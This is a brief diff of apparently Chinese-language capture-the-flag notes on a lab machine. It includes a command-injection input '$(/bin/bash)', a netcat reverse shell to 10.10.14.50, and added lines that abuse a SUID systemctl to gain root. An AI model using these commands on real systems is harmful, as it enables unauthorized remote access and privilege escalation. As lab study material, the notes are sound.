@@ -46,3 +46,6 @@ input輸入$(/bin/bash)
 nc -e /bin/bash 10.10.14.50 6666
 11.上傳LinEnum.sh發現suid檔案有systemctl可以執行,參考以下連接使用systemctl enable root.service取得root
 https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation
+
+systemctl enable root.service
+systemctl start root
